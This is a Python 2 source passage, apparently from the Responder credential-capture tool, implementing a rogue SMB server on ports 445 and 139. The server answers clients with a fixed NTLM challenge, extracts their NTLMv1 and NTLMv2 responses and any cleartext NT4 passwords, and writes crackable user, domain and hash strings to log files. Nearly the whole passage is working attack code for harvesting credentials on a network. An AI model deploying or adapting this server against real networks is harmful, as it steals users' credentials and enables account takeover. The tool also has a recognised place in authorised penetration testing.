##################################################################################
#SMB stuff starts here
##################################################################################

class ThreadingTCPServer(ThreadingMixIn, TCPServer):

	allow_reuse_address = 1

	def server_bind(self):
		TCPServer.server_bind(self)

def serve_thread_tcp(host, port, handler):
	try:
		server = ThreadingTCPServer((host, port), handler)
		server.serve_forever()
	except Exception, e:
		print "Error starting TCP server on port %s: %s:" % (str(port),str(e))

#Function name self-explanatory
def Is_SMB_On(SMB_On_Off):

	if SMB_On_Off == "ON":
		if LM_On_Off == True:
			t1  = threading.Thread(name="SMB1LM-445", target=self.serve_thread_tcp, args=("0.0.0.0", 445, SMB1LM))
			t2 = threading.Thread(name="SMB1LM-139", target=self.serve_thread_tcp, args=("0.0.0.0", 139, SMB1LM))
			for t in [t1, t2]:
				t.setDaemon(True)
				t.start()

			return t1, t2

		else:
			t1 = threading.Thread(name="SMB1-445", target=serve_thread_tcp, args=("0.0.0.0", 445, SMB1))
			t2 = threading.Thread(name="SMB1-139", target=serve_thread_tcp, args=("0.0.0.0", 139, SMB1))

			for t in [t1,t2]:
				t.setDaemon(True)
				t.start()

			return t1, t2

	if SMB_On_Off == "OFF":
		return False

#Detect if SMB auth was Anonymous
def Is_Anonymous(data):
	SecBlobLen = struct.unpack('<H',data[51:53])[0]
	if SecBlobLen < 260:
		SSPIStart = data[75:]
		LMhashLen = struct.unpack('<H',data[89:91])[0]
		if LMhashLen == 0 or LMhashLen == 1:
			return True
		else:
			return False
	if SecBlobLen > 260:
		SSPIStart = data[79:]
		LMhashLen = struct.unpack('<H',data[93:95])[0]
		if LMhashLen == 0 or LMhashLen == 1:
			return True
		else:
			return False

def Is_LMNT_Anonymous(data):
	LMhashLen = struct.unpack('<H',data[51:53])[0]
	if LMhashLen == 0 or LMhashLen == 1:
		return True
	else:
		return False

#Function used to know which dialect number to return for NT LM 0.12
def Parse_Nego_Dialect(data):
	DialectStart = data[40:]
	pack = tuple(DialectStart.split('\x02'))[:10]
	var = [e.replace('\x00','') for e in DialectStart.split('\x02')[:10]]
	test = tuple(var)
	if test[0] == "NT LM 0.12":
		return "\x00\x00"
	if test[1] == "NT LM 0.12":
		return "\x01\x00"
	if test[2] == "NT LM 0.12":
		return "\x02\x00"
	if test[3] == "NT LM 0.12":
		return "\x03\x00"
	if test[4] == "NT LM 0.12":
		return "\x04\x00"
	if test[5] == "NT LM 0.12":
		return "\x05\x00"
	if test[6] == "NT LM 0.12":
		return "\x06\x00"
	if test[7] == "NT LM 0.12":
		return "\x07\x00"
	if test[8] == "NT LM 0.12":
		return "\x08\x00"
	if test[9] == "NT LM 0.12":
		return "\x09\x00"
	if test[10] == "NT LM 0.12":
		return "\x0a\x00"

def ParseShare(data):
	packet = data[:]
	a = re.search('(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
	if a:
		quote = "Share requested: "+a.group(0)
		responder_logger.info(quote.replace('\x00',''))

#Parse SMB NTLMSSP v1/v2
def ParseSMBHash(data,client):
	SecBlobLen = struct.unpack('<H',data[51:53])[0]
	BccLen = struct.unpack('<H',data[61:63])[0]
	if SecBlobLen < 260:
		SSPIStart = data[75:]
		LMhashLen = struct.unpack('<H',data[89:91])[0]
		LMhashOffset = struct.unpack('<H',data[91:93])[0]
		LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
		NthashLen = struct.unpack('<H',data[97:99])[0]
		NthashOffset = struct.unpack('<H',data[99:101])[0]

	if SecBlobLen > 260:
		SSPIStart = data[79:]
		LMhashLen = struct.unpack('<H',data[93:95])[0]
		LMhashOffset = struct.unpack('<H',data[95:97])[0]
		LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
		NthashLen = struct.unpack('<H',data[101:103])[0]
		NthashOffset = struct.unpack('<H',data[103:105])[0]

	if NthashLen == 24:
		NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		DomainLen = struct.unpack('<H',data[105:107])[0]
		DomainOffset = struct.unpack('<H',data[107:109])[0]
		Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[113:115])[0]
		UserOffset = struct.unpack('<H',data[115:117])[0]
		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
		writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
		outfile = "./logs/responder/SMB-NTLMv1ESS-Client-"+client+".txt"
		WriteData(outfile,writehash,User+"::"+Domain)
		responder_logger.info('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))

	if NthashLen > 60:
		outfile = "./logs/responder/SMB-NTLMv2-Client-"+client+".txt"
		NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		DomainLen = struct.unpack('<H',data[109:111])[0]
		DomainOffset = struct.unpack('<H',data[111:113])[0]
		Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[117:119])[0]
		UserOffset = struct.unpack('<H',data[119:121])[0]
		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
		writehash = User+"::"+Domain+":"+NumChal+":"+NtHash[:32]+":"+NtHash[32:]
		WriteData(outfile,writehash,User+"::"+Domain)
		responder_logger.info('[+]SMB-NTLMv2 complete hash is :%s'%(writehash))

#Parse SMB NTLMv1/v2
def ParseLMNTHash(data,client):
	try:
		lenght = struct.unpack('<H',data[43:45])[0]
		LMhashLen = struct.unpack('<H',data[51:53])[0]
		NthashLen = struct.unpack('<H',data[53:55])[0]
		Bcc = struct.unpack('<H',data[63:65])[0]
		if NthashLen > 25:
			Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
			responder_logger.info('[+]SMB-NTLMv2 hash captured from :%s'%(client))
			outfile = "./logs/responder/SMB-NTLMv2-Client-"+client+".txt"
			pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
			var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
			Username, Domain = tuple(var)
			Writehash = Username+"::"+Domain+":"+NumChal+":"+Hash.encode('hex')[:32].upper()+":"+Hash.encode('hex')[32:].upper()
			ParseShare(data)
			WriteData(outfile,Writehash, Username+"::"+Domain)
			responder_logger.info('[+]SMB-NTLMv2 complete hash is :%s'%(Writehash))
		if NthashLen == 24:
			responder_logger.info('[+]SMB-NTLMv1 hash captured from :%s'%(client))
			outfile = "./logs/responder/SMB-NTLMv1-Client-"+client+".txt"
			pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
			var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
			Username, Domain = tuple(var)
			writehash = Username+"::"+Domain+":"+data[65:65+LMhashLen].encode('hex').upper()+":"+data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()+":"+NumChal
			ParseShare(data)
			WriteData(outfile,writehash, Username+"::"+Domain)
			responder_logger.info('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
			responder_logger.info('[+]SMB-NTLMv1 Username:%s'%(Username))
			responder_logger.info('[+]SMB-NTLMv1 Domain (if joined, if not then computer name) :%s'%(Domain))
	except Exception:
		raise

def IsNT4ClearTxt(data):
	HeadLen = 36
	Flag2 = data[14:16]
	if Flag2 == "\x03\x80":
		SmbData = data[HeadLen+14:]
		WordCount = data[HeadLen]
		ChainedCmdOffset = data[HeadLen+1]
		if ChainedCmdOffset == "\x75":
			PassLen = struct.unpack('<H',data[HeadLen+15:HeadLen+17])[0]
			if PassLen > 2:
				Password = data[HeadLen+30:HeadLen+30+PassLen].replace("\x00","")
				User = ''.join(tuple(data[HeadLen+30+PassLen:].split('\x00\x00\x00'))[:1]).replace("\x00","")
				#print "[SMB]Clear Text Credentials: %s:%s" %(User,Password)
				responder_logger.info("[SMB]Clear Text Credentials: %s:%s"%(User,Password))

#SMB Server class, NTLMSSP
class SMB1(BaseRequestHandler):

	def handle(self):
		try:
			while True:
				data = self.request.recv(1024)
				self.request.settimeout(1)
				##session request 139
				if data[0] == "\x81":
					buffer0 = "\x82\x00\x00\x00"
					self.request.send(buffer0)
					data = self.request.recv(1024)
				##Negotiate proto answer.
				if data[8:10] == "\x72\x00":
					#Customize SMB answer.
					head = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(data),mid=midcalc(data))
					t = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(data))
					t.calculate()
					final = t
					packet0 = str(head)+str(final)
					buffer0 = longueur(packet0)+packet0
					self.request.send(buffer0)
					data = self.request.recv(1024)
					##Session Setup AndX Request
				if data[8:10] == "\x73\x00":
					IsNT4ClearTxt(data)
					head = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(data),tid="\x00\x00",mid=midcalc(data))
					t = SMBSession1Data(NTLMSSPNtServerChallenge=Challenge)
					t.calculate()
					final = t
					packet1 = str(head)+str(final)
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
					data = self.request.recv(4096)
					if data[8:10] == "\x73\x00":
						if Is_Anonymous(data):
							head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))###should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
							final = SMBSessEmpty()
							packet1 = str(head)+str(final)
							buffer1 = longueur(packet1)+packet1
							self.request.send(buffer1)
						else:
							ParseSMBHash(data,self.client_address[0])
							head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
							final = SMBSession2Accept()
							final.calculate()
							packet2 = str(head)+str(final)
							buffer2 = longueur(packet2)+packet2
							self.request.send(buffer2)
							data = self.request.recv(1024)
				##Tree Connect IPC Answer
				if data[8:10] == "\x75\x00":
					ParseShare(data)
					head = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", pid=pidcalc(data), tid=chr(randrange(256))+chr(randrange(256)), uid=uidcalc(data), mid=midcalc(data))
					t = SMBTreeData()
					t.calculate()
					final = t
					packet1 = str(head)+str(final)
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
					data = self.request.recv(1024)
				##Tree Disconnect.
				if data[8:10] == "\x71\x00":
					head = SMBHeader(cmd="\x71",flag1="\x98", flag2="\x07\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					final = "\x00\x00\x00"
					packet1 = str(head)+str(final)
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
					data = self.request.recv(1024)
				##NT_CREATE Access Denied.
				if data[8:10] == "\xa2\x00":
					head = SMBHeader(cmd="\xa2",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					final = "\x00\x00\x00"
					packet1 = str(head)+str(final)
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
					data = self.request.recv(1024)
				##Trans2 Access Denied.
				if data[8:10] == "\x25\x00":
					head = SMBHeader(cmd="\x25",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					final = "\x00\x00\x00"
					packet1 = str(head)+str(final)
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
					data = self.request.recv(1024)
				##LogOff.
				if data[8:10] == "\x74\x00":
					head = SMBHeader(cmd="\x74",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					final = "\x02\xff\x00\x27\x00\x00\x00"
					packet1 = str(head)+str(final)
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
					data = self.request.recv(1024)

		except Exception:
			pass #no need to print errors..

#SMB Server class, old version.
class SMB1LM(BaseRequestHandler):

	def handle(self):
		try:
			self.request.settimeout(0.5)
			data = self.request.recv(1024)
			##session request 139
			if data[0] == "\x81":
				buffer0 = "\x82\x00\x00\x00"
				self.request.send(buffer0)
				data = self.request.recv(1024)
				##Negotiate proto answer.
			if data[8:10] == "\x72\x00":
				head = SMBHeader(cmd="\x72",flag1="\x80", flag2="\x00\x00",pid=pidcalc(data),mid=midcalc(data))
				t = SMBNegoAnsLM(Dialect=Parse_Nego_Dialect(data),Domain="",Key=Challenge)
				t.calculate()
				packet1 = str(head)+str(t)
				buffer1 = longueur(packet1)+packet1
				self.request.send(buffer1)
				data = self.request.recv(1024)
				##Session Setup AndX Request
			if data[8:10] == "\x73\x00":
				if Is_LMNT_Anonymous(data):
					head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					packet1 = str(head)+str(SMBSessEmpty())
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
				else:
					ParseLMNTHash(data,self.client_address[0])
					head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					packet1 = str(head)+str(SMBSessEmpty())
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
					data = self.request.recv(1024)

		except Exception:
			self.request.close()
			pass

##################################################################################
#SMB Server stuff ends here
##################################################################################